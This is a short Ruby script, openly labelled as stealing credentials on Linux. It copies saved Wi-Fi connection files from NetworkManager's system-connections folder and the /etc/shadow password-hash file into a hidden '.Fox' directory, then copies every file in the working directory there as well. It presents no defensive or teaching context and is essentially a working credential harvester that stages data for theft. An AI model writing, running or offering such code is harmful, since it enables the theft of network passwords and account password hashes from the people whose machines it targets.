require 'fileutils'

### Steal WIFI Password On Linux ###
files = Dir.entries('/etc/NetworkManager/system-connections/').select do |f|
  File.file? File.join('/etc/NetworkManager/system-connections/', f)
end
Dir.mkdir('.Fox')
num = 1
files.each do |line|
  data_read = File.read("/etc/NetworkManager/system-connections/#{line}")
  File.open(".Fox/WIFI-#{num}.txt", 'w') do |word|
    word.puts data_read
  end
  num += 1
end

### Steal Linux Password ###
os_pass = File.read('/etc/shadow')
File.open('.Fox/OS_Pass.txt', 'w') do |line|
  line.puts os_pass
end

### Take Backup ###
data = Dir.entries('.').select { |f| File.file? File.join('.', f) }
Dir.mkdir('.Fox/BackUP')
data.each do |file|
  FileUtils.cp file, '.Fox/BackUP'
end
